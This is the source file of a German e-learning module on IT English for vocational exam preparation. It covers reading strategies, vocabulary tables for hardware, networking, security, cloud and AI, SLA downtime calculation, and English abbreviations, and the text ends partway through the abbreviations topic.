/* ENG – Englisch (IT-Fachsprache) */
LEARN.module({
  id: "englisch",
  type: "fach",
  title: "Englisch (IT-Fachsprache)",
  exam: ["AP1", "AP2"],
  summary: "IT-Englisch für Berufsschule und IHK-Prüfung: Fachvokabular nach Themen, Abkürzungen, Datenblätter, Handbücher, Changelogs und Fehlermeldungen verstehen, im Support und per E-Mail auf Englisch kommunizieren, präsentieren sowie Prozesse und Grafiken beschreiben – mit Grammatik-Basics und False Friends.",
  goals: [
    "Englische Fachtexte, Datenblätter und Hersteller-Mails gezielt auswerten und die geforderten Informationen korrekt auf Deutsch wiedergeben",
    "Zentrales IT-Fachvokabular aus Hardware, Networking, Security, Software, Cloud, KI und Service Desk sicher übersetzen und erklären",
    "Gängige Abkürzungen und Akronyme sowie englische Zahlen-, Datums- und Einheitenschreibweisen fehlerfrei deuten und umrechnen",
    "Englische Fehlermeldungen, Konsolenausgaben, Logeinträge und Changelogs interpretieren und daraus nächste Schritte ableiten",
    "Support-Gespräche am Telefon, per E-Mail und im Ticket höflich, strukturiert und lösungsorientiert auf Englisch führen",
    "Business-E-Mails (Anfrage, Statusmeldung, Antwort auf eine Beschwerde) formal korrekt aufbauen und passende Redemittel einsetzen",
    "Eine Präsentation auf Englisch planen, mit Signposting gliedern und mit Körpersprache und Stimme überzeugend halten",
    "Prozesse, Abläufe und Diagramme auf Englisch beschreiben (Sequencing, Trendvokabular, Passiv) und Veränderungen in Prozent berechnen",
    "Grammatik fürs Technik-Englisch (Passiv, Imperativ, if-Sätze, Modalverben, Zeiten) anwenden und typische False Friends vermeiden"
  ],
  school: {
    hinweise: "Im Englischunterricht der AIFS51 arbeitet ihr mit einem Kursbuch zum Thema „IT Matters (or does it?)“ und einem Language-Support-Teil (Grammatik und Redemittel). Ein Schwerpunkt ist die Presentation Improvement: gute und schlechte Präsentationen vergleichen, Tipps für bessere Vorträge, Körpersprache und Haltung sowie die Planung einer Präsentation – geübt auch an fachfremden Beispielen wie einer englischen Kochanleitung im Stil eines Konferenzvortrags (Agenda, Tabellen, Schnittbild, Troubleshooting-Tabelle). In der IHK-Prüfung ist Englisch kein eigener Prüfungsbereich, taucht aber seit der 2. Auflage des Prüfungskatalogs (gültig ab AP1 Frühjahr 2025) in praktisch jeder AP1 auf (Datenblatt, Fachtext, Hersteller-Mail). Antworte dort auf Deutsch, sofern nichts anderes verlangt ist.",
    themen: [
      "Presentation Improvement: good vs. bad presentations",
      "Tipps für bessere Präsentationen",
      "Body language and posture",
      "How to plan a presentation",
      "Kursbuch „IT Matters“: IT-Fachtexte und Vokabular",
      "Language Support: Grammatik und Redemittel",
      "Anleitungen und Abläufe präsentieren (Übungspräsentation mit fachfremdem Thema)"
    ]
  },
  topics: [
    {
      id: "pruefung-lesen",
      title: "Englisch in der Prüfung & Lesestrategien",
      exam: ["AP1", "AP2"],
      summary: "Wo Englisch in AP1 und AP2 vorkommt, wie du englische Texte mit Skimming und Scanning schnell auswertest und warum die Antwort auf Deutsch gehört.",
      html: `
        <p>Englisch ist in der IHK-Prüfung <strong>kein eigener Prüfungsbereich</strong>. Laut Prüfungskatalog fließt es aber <strong>bereichsübergreifend</strong> in alle Aufgaben ein. Seit der 2. Katalogauflage (erstmals für die AP1 im Frühjahr 2025 und die AP2 im Sommer 2025) steht im AP1-Katalog ausdrücklich die „Interpretation englischsprachiger Texte“ und das Auswerten technischer und kaufmännischer Texte „in deutscher und englischer Sprache“. In den AP1-Prüfungen seit 2025 gab es praktisch jedes Mal einen englischen Text.</p>
        <h5>Wo dir Englisch begegnet</h5>
        <table><thead><tr><th>Prüfung</th><th>Typische Textsorte</th><th>Was du tun musst</th></tr></thead><tbody>
          <tr><td>AP1</td><td>Datenblatt (Kamera, Monitor, Drucker, Notebook)</td><td>Kennwerte heraussuchen, Begriffe wie <em>IR range</em>, <em>heater</em>, <em>daisy chaining</em> erklären, mit den Werten rechnen</td></tr>
          <tr><td>AP1</td><td>kurzer Fachtext (z. B. <em>change management</em>, IT-Security)</td><td>Kernaussagen auf Deutsch wiedergeben, Beispiele nennen</td></tr>
          <tr><td>AP1/AP2</td><td>Hersteller-Mail, Angebot, Supportantwort</td><td>Problem, Frist, empfohlene Maßnahme erkennen</td></tr>
          <tr><td>AP2</td><td>Fehlermeldung, Konsolenausgabe, Logauszug, Handbuch</td><td>Ursache deuten und nächsten Schritt ableiten</td></tr>
          <tr><td>Berufsschule</td><td>Klassenarbeit, Präsentation, E-Mail, Telefonat</td><td>aktiv auf Englisch schreiben und sprechen</td></tr>
        </tbody></table>
        <h5>Drei Lesestrategien</h5>
        <ol>
          <li><strong>Skimming (Überfliegen):</strong> Überschrift, Zwischenüberschriften, Fettgedrucktes und jeweils den ersten Satz eines Absatzes lesen. Ziel: Worum geht es? (30–60 Sekunden)</li>
          <li><strong>Scanning (gezieltes Suchen):</strong> Lies zuerst die Frage, dann suche nur nach Schlüsselwörtern, Zahlen und Einheiten (z. B. <em>W</em>, <em>°C</em>, <em>Mbps</em>, <em>warranty</em>).</li>
          <li><strong>Detailed reading (genaues Lesen):</strong> Nur die gefundenen Stellen Satz für Satz verstehen – dort liegen die Punkte.</li>
        </ol>
        <h5>Unbekannte Wörter erschließen</h5>
        <ul>
          <li><strong>Kontext:</strong> „The camera has a built-in <em>heater</em> for operation down to −30 °C“ → es geht um Kälte, also eine Heizung.</li>
          <li><strong>Wortfamilie:</strong> <em>to encrypt</em> → <em>encryption</em> (Verschlüsselung) → <em>encrypted</em> (verschlüsselt).</li>
          <li><strong>Vor- und Nachsilben:</strong> <em>un-/in-/dis-</em> = nicht (<em>unavailable</em>, <em>disconnected</em>), <em>re-</em> = erneut (<em>reboot</em>), <em>pre-</em> = vorab (<em>pre-installed</em>), <em>-less</em> = ohne (<em>fanless</em> = lüfterlos), <em>-able</em> = kann (<em>hot-swappable</em> = im laufenden Betrieb tauschbar).</li>
          <li><strong>Internationalismen:</strong> <em>server, protocol, firewall, backup</em> – im Deutschen oft gleich.</li>
        </ul>
        <div class="callout beispiel"><strong>Beispiel: Fachtext auswerten</strong><br>Text (Auszug): „Change management is not only about new software. Employees need to understand <em>why</em> a change is necessary. Involve users early, communicate openly and offer training. Resistance is normal – take concerns seriously instead of ignoring them.“<br><strong>Aufgabe:</strong> Gib drei Kernaussagen auf Deutsch wieder.<br><strong>Lösung:</strong> (1) Bei Veränderungen geht es nicht nur um Technik, sondern vor allem um die Menschen: Die Beschäftigten müssen den Grund für die Änderung verstehen. (2) Die Nutzer sollen früh eingebunden, offen informiert und geschult werden. (3) Widerstand ist normal; Bedenken sollen ernst genommen statt übergangen werden.</div>
        <h5>Übersetzen oder sinngemäß wiedergeben?</h5>
        <ul>
          <li><strong>„Übersetzen Sie …“</strong> – möglichst genau, aber in natürlichem Deutsch, nicht Wort für Wort.</li>
          <li><strong>„Geben Sie sinngemäß / die Kernaussagen wieder“</strong> – eigene Sätze, nur das Wesentliche, keine Details.</li>
          <li><strong>„Erklären Sie die Bedeutung von …“</strong> – Begriff übersetzen <em>und</em> kurz sagen, wozu er dient (z. B. „IR = Infrarot: Die Kamera kann nachts bis 30 m weit sehen“).</li>
        </ul>
        <div class="callout achtung"><strong>Prüfungsfalle:</strong> Antworte auf <strong>Deutsch</strong>, wenn nichts anderes verlangt ist – laut Erfahrungsberichten von Prüflingen hat genau das in der AP1 Herbst 2025 Punkte gekostet. Achte außerdem auf <em>up to</em> („bis zu“ = Höchstwert, nicht garantiert) und auf Einschränkungen wie <em>only</em>, <em>not</em>, <em>except</em>, <em>unless</em> (außer, wenn nicht).</div>
        <div class="callout merke"><strong>Merke:</strong> Erst die Frage lesen, dann den Text scannen. Punkte gibt es für die richtigen Informationen – nicht für eine vollständige Übersetzung.</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> „Erläutern Sie anhand des englischen Datenblatts im Belegsatz die Begriffe ‚IR‘ und ‚heater‘.“ (2–4 P) · „Geben Sie die drei Kernaussagen des englischen Textes auf Deutsch wieder.“ (3–6 P) · „Prüfen Sie anhand des Datenblatts, ob das Gerät mit PoE nach IEEE 802.3af betrieben werden kann.“ (2–4 P)</div>
      `
    },
    {
      id: "vokabeln-hardware",
      title: "Vokabular: Hardware & Datenblatt-Begriffe",
      exam: ["AP1", "AP2"],
      summary: "Die wichtigsten englischen Begriffe aus Datenblättern für PCs, Monitore, Kameras, Drucker und Stromversorgung – mit Wortbildung und typischen Verwechslungen.",
      html: `
        <p>Datenblätter (<em>datasheets, spec sheets</em>) sind fast immer englisch. Wer die folgenden Begriffe sicher kennt, kann in der Prüfung schnell Kennwerte finden und vergleichen.</p>
        <h5>Komponenten eines PCs bzw. Servers</h5>
        <table><thead><tr><th>Englisch</th><th>Deutsch</th><th>Hinweis</th></tr></thead><tbody>
          <tr><td>motherboard / mainboard, chipset</td><td>Hauptplatine, Chipsatz</td><td>verbindet alle Komponenten</td></tr>
          <tr><td>processor (CPU), cores / threads</td><td>Prozessor, Kerne / Threads</td><td><em>base clock / boost clock</em> = Basis- / Turbotakt in GHz</td></tr>
          <tr><td>graphics card (GPU), integrated graphics</td><td>Grafikkarte, im Prozessor integrierte Grafik</td><td><em>dedicated</em> = eigene Grafikkarte mit eigenem Speicher</td></tr>
          <tr><td>memory module (DIMM / SO-DIMM), dual channel</td><td>Speicherriegel (Desktop / Notebook), Zweikanalbetrieb</td><td>zwei gleiche Riegel → doppelte Speicherbandbreite</td></tr>
          <tr><td>drive: SSD (M.2, NVMe), HDD</td><td>Laufwerk: Halbleiterlaufwerk, Festplatte</td><td><em>capacity</em> = Kapazität</td></tr>
          <tr><td>expansion card, PCIe slot</td><td>Erweiterungskarte, PCIe-Steckplatz</td><td>z. B. Netzwerk- oder RAID-Controller-Karte</td></tr>
          <tr><td>heat sink, thermal paste, fan</td><td>Kühlkörper, Wärmeleitpaste, Lüfter</td><td><em>TDP</em> = thermische Verlustleistung, für die die Kühlung ausgelegt sein muss</td></tr>
          <tr><td>case / chassis, rack unit (U)</td><td>Gehäuse, Höheneinheit im Serverschrank</td><td>1 U = 1,75 inch = 4,445 cm</td></tr>
          <tr><td>peripherals, docking station</td><td>Peripheriegeräte, Dockingstation</td><td>Tastatur, Maus, Headset, Webcam …</td></tr>
        </tbody></table>
        <h5>Leistung und Stromversorgung</h5>
        <table><thead><tr><th>Englisch</th><th>Deutsch</th><th>Hinweis</th></tr></thead><tbody>
          <tr><td>power consumption (typical / max.)</td><td>Leistungsaufnahme (typisch / maximal)</td><td>in W; für Stromkosten den typischen Wert nehmen, für die Dimensionierung den Maximalwert</td></tr>
          <tr><td>power supply unit (PSU)</td><td>Netzteil</td><td><em>rated power</em> = Nennleistung</td></tr>
          <tr><td>efficiency</td><td>Wirkungsgrad η</td><td>z. B. „90 % efficiency“ → η = 0,9</td></tr>
          <tr><td>standby / idle / sleep mode</td><td>Bereitschaft / Leerlauf / Ruhezustand</td><td>idle = eingeschaltet, aber ohne Last</td></tr>
          <tr><td>uninterruptible power supply (UPS)</td><td>unterbrechungsfreie Stromversorgung (USV)</td><td><em>runtime</em> = Überbrückungszeit</td></tr>
          <tr><td>surge protection</td><td>Überspannungsschutz</td><td></td></tr>
        </tbody></table>
        <h5>Leistungsfähigkeit und Anschlüsse</h5>
        <table><thead><tr><th>Englisch</th><th>Deutsch</th></tr></thead><tbody>
          <tr><td>throughput / transfer rate</td><td>Durchsatz / Übertragungsrate (tatsächlich erreichte Datenrate)</td></tr>
          <tr><td>latency / response time</td><td>Verzögerung, Latenz / Reaktionszeit (bei Monitoren: Umschaltzeit in ms)</td></tr>
          <tr><td>memory vs. storage</td><td>Arbeitsspeicher (RAM) vs. Massenspeicher (SSD/HDD)</td></tr>
          <tr><td>port, interface, slot, bay</td><td>Anschluss, Schnittstelle, Steckplatz, Einbauschacht</td></tr>
          <tr><td>backward compatible</td><td>abwärtskompatibel (funktioniert auch mit älteren Standards)</td></tr>
          <tr><td>daisy chaining</td><td>Reihenschaltung, „Durchschleifen“: Gerät 2 hängt an Gerät 1 statt direkt am PC (z. B. Monitore über DisplayPort MST)</td></tr>
          <tr><td>hot-swappable / hot-pluggable</td><td>im laufenden Betrieb tauschbar / einsteckbar</td></tr>
          <tr><td>refresh rate, resolution, brightness, contrast ratio</td><td>Bildwiederholrate (Hz), Auflösung, Helligkeit (cd/m²), Kontrastverhältnis</td></tr>
          <tr><td>height-adjustable, tilt, swivel, pivot</td><td>höhenverstellbar, neigbar, drehbar, ins Hochformat drehbar</td></tr>
          <tr><td>anti-glare / matte, flicker-free</td><td>entspiegelt / matt, flimmerfrei (Ergonomie)</td></tr>
        </tbody></table>
        <h5>Umgebung, Bauform, Service</h5>
        <table><thead><tr><th>Englisch</th><th>Deutsch</th></tr></thead><tbody>
          <tr><td>operating / storage temperature</td><td>Betriebs- / Lagertemperatur</td></tr>
          <tr><td>humidity (non-condensing)</td><td>Luftfeuchtigkeit (nicht kondensierend)</td></tr>
          <tr><td>heater, fan, fanless</td><td>Heizung, Lüfter, lüfterlos</td></tr>
          <tr><td>IR (infrared) night vision, IR range</td><td>Infrarot-Nachtsicht, Reichweite der IR-Beleuchtung</td></tr>
          <tr><td>enclosure / housing, form factor, dimensions, weight</td><td>Gehäuse, Bauform, Abmessungen, Gewicht</td></tr>
          <tr><td>warranty, lead time, end of life (EOL)</td><td>Herstellergarantie, Lieferzeit, Ende der Produktion/Unterstützung</td></tr>
          <tr><td>purchase / lease / rent</td><td>Kauf / Leasing / Miete (Beschaffungsvarianten)</td></tr>
          <tr><td>MTBF (mean time between failures)</td><td>mittlere Betriebsdauer zwischen zwei Ausfällen</td></tr>
          <tr><td>compliance, certifications</td><td>Normen/Zulassungen (z. B. CE, RoHS, Energy Star, TCO Certified)</td></tr>
        </tbody></table>
        <div class="callout beispiel"><strong>Beispiel: Datenblatt-Zeile verstehen</strong><br>„27-inch IPS display, 2560 × 1440, 75 Hz, USB-C with 65 W power delivery, DisplayPort out (MST) for daisy chaining, height-adjustable stand, flicker-free, 3-year warranty“<br>→ 27-Zoll-Monitor (27 × 2,54 cm = 68,58 cm Diagonale) mit WQHD-Auflösung und 75 Hz. Über ein einziges USB-C-Kabel wird das Notebook mit bis zu 65 W geladen. Über den DisplayPort-Ausgang lässt sich ein zweiter Monitor anschließen (Reihenschaltung per MST). Höhenverstellbarer Fuß, flimmerfrei, 3 Jahre Herstellergarantie.</div>
        <div class="callout achtung"><strong>Verwechslungsgefahr:</strong> <em>warranty</em> in Datenblättern ist die freiwillige <strong>Herstellergarantie</strong> – nicht die gesetzliche Gewährleistung (im Englischen z. B. <em>statutory warranty</em>). <em>Memory</em> ist meist RAM, nicht Festplattenspeicher. <em>Max. power consumption</em> ist kein Durchschnittswert.</div>
        <div class="callout tipp"><strong>Eselsbrücke:</strong> „-less“ heißt „ohne“ (fanless, wireless, cordless), „-able“ heißt „kann“ (adjustable, swappable, upgradeable).</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> „Erklären Sie die markierten Begriffe des Datenblatts auf Deutsch.“ · „Ermitteln Sie aus dem Datenblatt die Leistungsaufnahme und berechnen Sie die jährlichen Stromkosten.“ · „Beurteilen Sie, ob der Monitor die ergonomischen Anforderungen erfüllt.“</div>
      `
    },
    {
      id: "vokabeln-netzwerk-security",
      title: "Vokabular: Networking & IT-Security",
      exam: ["AP1", "AP2"],
      summary: "Englische Kernbegriffe aus Netzwerktechnik, IT-Sicherheit und Datenschutz – mit den klassischen Paaren bandwidth/throughput, authentication/authorization und threat/vulnerability.",
      html: `
        <p>Handbücher von Switches, Routern und Firewalls, Sicherheitswarnungen (<em>security advisories</em>) und Konsolenausgaben sind englisch. Viele Begriffe kommen als <strong>Paare</strong> vor, die man leicht verwechselt – genau die werden gern geprüft.</p>
        <h5>Networking</h5>
        <table><thead><tr><th>Englisch</th><th>Deutsch / Bedeutung</th></tr></thead><tbody>
          <tr><td>bandwidth</td><td>Bandbreite: theoretisch maximale Datenrate einer Verbindung</td></tr>
          <tr><td>throughput</td><td>Durchsatz: tatsächlich erreichte Datenrate (immer ≤ bandwidth)</td></tr>
          <tr><td>latency / jitter / packet loss</td><td>Verzögerung / Schwankung der Verzögerung / Paketverlust (wichtig für VoIP)</td></tr>
          <tr><td>default gateway</td><td>Standardgateway: Router, an den Pakete in fremde Netze gehen</td></tr>
          <tr><td>subnet mask, prefix length</td><td>Subnetzmaske, Präfixlänge (/24)</td></tr>
          <tr><td>to assign / to resolve</td><td>zuweisen (DHCP weist Adressen zu) / auflösen (DNS löst Namen auf)</td></tr>
          <tr><td>lease (DHCP lease)</td><td>befristete Adresszuweisung durch DHCP</td></tr>
          <tr><td>access point, patch panel, wall outlet</td><td>WLAN-Zugangspunkt, Patchfeld, Netzwerkdose</td></tr>
          <tr><td>uplink, trunk, redundancy, failover</td><td>Verbindung zur höheren Ebene, VLAN-Sammelleitung, Redundanz, automatische Umschaltung auf Ersatz</td></tr>
          <tr><td>availability / uptime / downtime</td><td>Verfügbarkeit / Betriebszeit / Ausfallzeit</td></tr>
          <tr><td>PoE budget</td><td>Gesamtleistung, die ein Switch über PoE bereitstellen kann</td></tr>
        </tbody></table>
        <h5>IT-Security</h5>
        <table><thead><tr><th>Englisch</th><th>Deutsch / Bedeutung</th></tr></thead><tbody>
          <tr><td>threat</td><td>Bedrohung (z. B. Ransomware-Gruppe, Hochwasser)</td></tr>
          <tr><td>vulnerability</td><td>Schwachstelle (z. B. ungepatchte Software)</td></tr>
          <tr><td>exploit</td><td>Angriffscode, der eine Schwachstelle ausnutzt; <em>to exploit</em> = ausnutzen</td></tr>
          <tr><td>risk</td><td>Risiko = Eintrittswahrscheinlichkeit × Schadenshöhe</td></tr>
          <tr><td>zero-day (vulnerability)</td><td>Schwachstelle, die bereits ausgenutzt werden kann, für die es aber noch keinen Patch gibt</td></tr>
          <tr><td>malware, ransomware, phishing, social engineering</td><td>Schadsoftware, Erpressungstrojaner (verschlüsselt Daten), Abfischen von Zugangsdaten per gefälschter Mail/Website, Manipulation von Menschen statt Technik</td></tr>
          <tr><td>breach / data breach</td><td>Sicherheitsverletzung / Datenpanne (nach Art. 33 DSGVO in der Regel binnen 72 h an die Aufsichtsbehörde zu melden)</td></tr>
          <tr><td>authentication</td><td>Authentifizierung: Wer bist du? (Passwort, Token, Fingerabdruck)</td></tr>
          <tr><td>authorization</td><td>Autorisierung: Was darfst du? (Rechte, Rollen)</td></tr>
          <tr><td>encryption / decryption, hash</td><td>Verschlüsselung / Entschlüsselung, Prüfsumme (Einwegfunktion)</td></tr>
          <tr><td>multi-factor authentication (MFA)</td><td>Mehr-Faktor-Authentifizierung (Wissen, Besitz, Biometrie)</td></tr>
          <tr><td>least privilege</td><td>Prinzip der minimalen Rechte</td></tr>
          <tr><td>hardening, patch, to mitigate</td><td>Härtung, Fehlerkorrektur, abschwächen/eindämmen</td></tr>
          <tr><td>backup / restore / recovery</td><td>Datensicherung / Wiederherstellen der Daten / Wiederanlauf nach einem Ausfall</td></tr>
          <tr><td>firewall rule: allow / reject / drop</td><td>Regel: erlauben / ablehnen mit Rückmeldung an den Absender / stillschweigend verwerfen (<em>deny</em> bedeutet je nach Hersteller eines von beiden)</td></tr>
          <tr><td>confidentiality, integrity, availability (CIA)</td><td>Vertraulichkeit, Integrität, Verfügbarkeit – die Schutzziele</td></tr>
        </tbody></table>
        <h5>Datenschutz</h5>
        <ul>
          <li><strong>data protection / privacy</strong> = Datenschutz (Schutz personenbezogener Daten) – <strong>information security</strong> = Informationssicherheit (Schutz aller Informationen).</li>
          <li><strong>personal data</strong> = personenbezogene Daten; <strong>sensitive data</strong> = besonders schützenswerte Daten.</li>
          <li><strong>GDPR</strong> (General Data Protection Regulation) = DSGVO; <strong>data processing agreement (DPA)</strong> = Auftragsverarbeitungsvertrag (AVV). Achtung: <em>DPA</em> steht auch für <em>data protection authority</em> = Datenschutzaufsichtsbehörde.</li>
          <li><strong>anonymisation / pseudonymisation</strong> = Anonymisierung / Pseudonymisierung.</li>
        </ul>
        <div class="callout beispiel"><strong>Beispiel: Security Advisory verstehen</strong><br>„A critical vulnerability in firmware 4.2.1 allows an unauthenticated attacker to execute arbitrary code. A patch is available. As a workaround, disable remote management until the update has been installed.“<br>→ In Firmware 4.2.1 gibt es eine kritische Schwachstelle: Ein Angreifer kann <em>ohne Anmeldung</em> beliebigen Code ausführen. Es gibt ein Update. Bis es installiert ist, soll als Übergangslösung die Fernverwaltung abgeschaltet werden.</div>
        <div class="callout achtung"><strong>Prüfungsfalle:</strong> <em>Authentication</em> (Identität prüfen) kommt immer <strong>vor</strong> <em>authorization</em> (Rechte prüfen). Und: <em>sensible</em> heißt „vernünftig“ – sensible Daten sind <strong>sensitive data</strong>.</div>
        <div class="callout merke"><strong>Merke:</strong> Threat (Bedrohung) + vulnerability (Schwachstelle) = risk (Risiko). Ohne Schwachstelle kann eine Bedrohung keinen Schaden anrichten.</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> „Übersetzen Sie die Begriffe <em>vulnerability</em>, <em>patch</em> und <em>workaround</em> und erläutern Sie die empfohlene Maßnahme aus der Hersteller-Mail.“ · „Unterscheiden Sie Authentifizierung und Autorisierung.“</div>
      `
    },
    {
      id: "vokabeln-software-cloud",
      title: "Vokabular: Software, Cloud & KI",
      exam: ["AP1", "AP2"],
      summary: "Englische Begriffe rund um Softwareversionen, Lizenzen, Deployment, Cloud-Modelle, SLA und künstliche Intelligenz.",
      html: `
        <p>Release Notes, Lizenzbedingungen, Cloud-Angebote und KI-Werkzeuge sind überwiegend englisch. Die Begriffe tauchen in AP1 (Softwareauswahl, Lizenzen, KI im Support) und AP2 (Cloud, Deployment, Updates) auf.</p>
        <h5>Software und Lizenzen</h5>
        <table><thead><tr><th>Englisch</th><th>Deutsch / Bedeutung</th></tr></thead><tbody>
          <tr><td>release, version, build</td><td>Veröffentlichung, Version, Programmstand</td></tr>
          <tr><td>update vs. upgrade</td><td>Aktualisierung innerhalb einer Version vs. Wechsel auf eine neue Hauptversion</td></tr>
          <tr><td>patch, hotfix</td><td>Fehlerkorrektur, dringende Einzelkorrektur</td></tr>
          <tr><td>bug, feature, known issue</td><td>Programmfehler, Funktion, bekanntes Problem</td></tr>
          <tr><td>deprecated</td><td>veraltet, wird noch unterstützt, aber künftig entfernt</td></tr>
          <tr><td>legacy system</td><td>Altsystem</td></tr>
          <tr><td>dependency, requirements</td><td>Abhängigkeit (benötigte Bibliothek), Systemvoraussetzungen</td></tr>
          <tr><td>to deploy, deployment, to roll out, rollback</td><td>bereitstellen, Bereitstellung, verteilen, Zurücksetzen auf den alten Stand</td></tr>
          <tr><td>licence (BE) / license (AE), subscription, perpetual licence</td><td>Lizenz, Abonnement, unbefristete Kauflizenz</td></tr>
          <tr><td>EULA (end-user license agreement)</td><td>Endbenutzer-Lizenzvertrag</td></tr>
          <tr><td>open source, proprietary</td><td>quelloffen, herstellergebunden (Quellcode geschlossen)</td></tr>
          <tr><td>repository, commit, branch, merge</td><td>Code-Ablage, Änderung speichern, Entwicklungszweig, zusammenführen (Git)</td></tr>
        </tbody></table>
        <h5>Cloud</h5>
        <table><thead><tr><th>Englisch</th><th>Deutsch / Bedeutung</th></tr></thead><tbody>
          <tr><td>on-premises (on-prem)</td><td>im eigenen Haus / eigenen Rechenzentrum betrieben</td></tr>
          <tr><td>IaaS / PaaS / SaaS</td><td>Infrastruktur / Plattform / Software als Dienst</td></tr>
          <tr><td>tenant</td><td>Mandant: abgegrenzter Bereich eines Kunden in einer Cloud</td></tr>
          <tr><td>scalability: scale up / scale out</td><td>Skalierbarkeit: vertikal (stärkere Maschine) / horizontal (mehr Maschinen)</td></tr>
          <tr><td>pay-as-you-go</td><td>nutzungsabhängige Abrechnung</td></tr>
          <tr><td>data centre (BE) / data center (AE), region</td><td>Rechenzentrum, Standortregion (wichtig für DSGVO)</td></tr>
          <tr><td>service level agreement (SLA), service credit</td><td>Leistungsvereinbarung, Gutschrift bei SLA-Verletzung</td></tr>
          <tr><td>vendor lock-in</td><td>Abhängigkeit von einem Anbieter (Wechsel teuer)</td></tr>
        </tbody></table>
        <div class="callout formel"><strong>Formel: erlaubte Ausfallzeit aus dem SLA</strong><br>Ausfallzeit = (1 − Verfügbarkeit) × Betrachtungszeitraum</div>
        <div class="callout beispiel"><strong>Beispiel:</strong> „We guarantee 99.9 % monthly uptime.“ Für einen Monat mit 30 Tagen: 30 × 24 × 60 min = 43.200 min. Erlaubte Ausfallzeit = 0,001 × 43.200 min = <strong>43,2 min pro Monat</strong>. Bei 99,95 % wären es nur 21,6 min.</div>
        <h5>Künstliche Intelligenz (AI)</h5>
        <ul>
          <li><strong>artificial intelligence (AI)</strong> = künstliche Intelligenz (KI); <strong>machine learning</strong> = maschinelles Lernen.</li>
          <li><strong>large language model (LLM)</strong> = großes Sprachmodell (Grundlage von Chatbots); <strong>generative AI</strong> = KI, die Texte, Bilder oder Code erzeugt.</li>
          <li><strong>prompt</strong> = Eingabe/Anweisung an die KI; <strong>training data</strong> = Trainingsdaten.</li>
          <li><strong>hallucination</strong> = plausibel klingende, aber falsche KI-Antwort; <strong>bias</strong> = Verzerrung durch einseitige Daten.</li>
          <li><strong>human in the loop</strong> = ein Mensch prüft oder gibt KI-Ergebnisse frei.</li>
          <li><strong>AI agent</strong> = KI-System, das selbstständig mehrere Schritte ausführt (z. B. Ticket anlegen, Passwort-Reset anstoßen); <strong>AI literacy</strong> = KI-Kompetenz: Wer KI nutzt, soll Chancen, Risiken und Grenzen der Systeme kennen (ausdrücklich ein Thema im EU AI Act).</li>
          <li><strong>EU AI Act</strong> = KI-Verordnung der EU (seit 1. August 2024 in Kraft), die KI-Systeme nach Risiko einstuft.</li>
        </ul>
        <div class="callout achtung"><strong>Prüfungsfalle:</strong> <em>Deprecated</em> heißt nicht „entfernt“, sondern „abgekündigt“ – die Funktion geht noch, sollte aber ersetzt werden. <em>Upgrade</em> kostet oft Geld oder Aufwand, ein <em>update</em> meist nicht.</div>
        <div class="callout pruefung"><strong>So kommt es in der Prüfung dran:</strong> „Erläutern Sie anhand des englischen Angebotsauszugs das Lizenzmodell.“ · „Berechnen Sie die laut SLA zulässige monatliche Ausfallzeit.“ · „Nennen Sie zwei Risiken beim Einsatz eines KI-Chatbots (z. B. hallucinations, Datenschutz).“</div>
      `
    },
    {
      id: "abkuerzungen",
      title: "Abkürzungen, Zahlen, Daten & Einheiten",
      exam: ["AP1", "AP2"],
      summary: "Die wichtigsten IT- und Business-Akronyme, englische Zahlen- und Datumsschreibweisen sowie das Umrechnen von Zoll, Fahrenheit und Datenraten.",
      html: `
        <p>Englische Texte stecken voller Abkürzungen – in Datenblättern (<em>PSU, MTBF, EOL</em>), E-Mails (<em>FYI, ASAP, ETA</em>) und Angeboten (<em>VAT, excl.</em>). Dazu kommen andere Schreibweisen für Zahlen, Datumsangaben und Einheiten. Hier passieren in der Prüfung leicht Rechenfehler.</p>
        <h5>IT-Akronyme (Auswahl)</h5>
        <table><thead><tr><th>Kürzel</th><th>Langform</th><th>Deutsch</th></tr></thead><tbody>
          <tr><td>PSU / UPS</td><td>power supply unit / uninterruptible power supply</td><td>Netzteil / USV</td></tr>
          <tr><td>NIC</td><td>network interface card</td><td>Netzwerkkarte</td></tr>
          <tr><td>NAS / SAN</td><td>network attached storage / storage area network</td><td>Netzwerkspeicher / Speichernetz</td></tr>
          <tr><td>OS, GUI, CLI</td><td>operating system, graphical user interface, command-line interface</td><td>Betriebssystem, grafische Oberfläche, Kommandozeile</td></tr>
          <tr><td>API</td><td>application programming interface</td><td>Programmierschnittstelle</td></tr>
          <tr><td>BYOD</td><td>bring your own device</td><td>private Geräte dienstlich nutzen</td></tr>
          <tr><td>EOL / EOS</td><td>end of life / end of support</td><td>Produktionsende / Supportende (keine Updates mehr)</td></tr>
          <tr><td>RMA</td><td>return merchandise authorization</td><td>Rücksendenummer für Reparatur/Austausch</td></tr>
          <tr><td>TCO / ROI</td><td>total cost of ownership / return on investment</td><td>Gesamtbetriebskosten / Kapitalrendite</td></tr>
          <tr><td>KPI, SLA, FAQ</td><td>key performance indicator, service level agreement, frequently asked questions</td><td>Kennzahl, Leistungsvereinbarung, häufige Fragen</td></tr>
        </tbody></table>
        <h5>Business-Kürzel in E-Mails</h5>
        <table><thead><tr><th>Kürzel</th><th>Bedeutung</th></tr></thead><tbody>
          <tr><td>ASAP</td><td>as soon as possible – so schnell wie möglich (in formellen Mails lieber ausschreiben)</td></tr>
          <tr><td>FYI</td><td>for your information – zur Kenntnisnahme</td></tr>
          <tr><td>ETA</td><td>estimated time of arrival – voraussichtliche Ankunft/Lieferung</td></tr>
          <tr><td>TBD / TBA</td><td>to be determined / announced – wird noch festgelegt / bekanntgegeben</td></tr>
          <tr><td>EOD / COB</td><td>end of day / close of business – bis Arbeitsende</td></tr>
          <tr><td>OOO</td><td>out of office – abwesend</td></tr>
          <tr><td>N/A</td><td>not applicable / not available – entfällt / nicht verfügbar</td></tr>
          <tr><td>e.g. / i.e.</td><td>for example (z. B.) / that is (d. h.)</td></tr>
          <tr><td>incl. / excl. VAT</td><td>inklusive / exklusive Mehrwertsteuer</td></tr>
          <tr><td>w/ / w/o</td><td>with / without</td></tr>
          <tr><td>cc / bcc</td><td>carbon copy / blind carbon copy – Kopie / Blindkopie</td></tr>
        </tbody></table>
        <h5>Zahlen und Datumsangaben</h5>
        <ul>
          <li><strong>Dezimalpunkt statt Komma:</strong> 1,250.50 USD = 1.250,50 USD. „2.5 GHz“ = 2,5 GHz.</li>
          <li><strong>billion</strong> = Milliarde (10⁹), <strong>trillion</strong> = Billion (10¹²).</li>
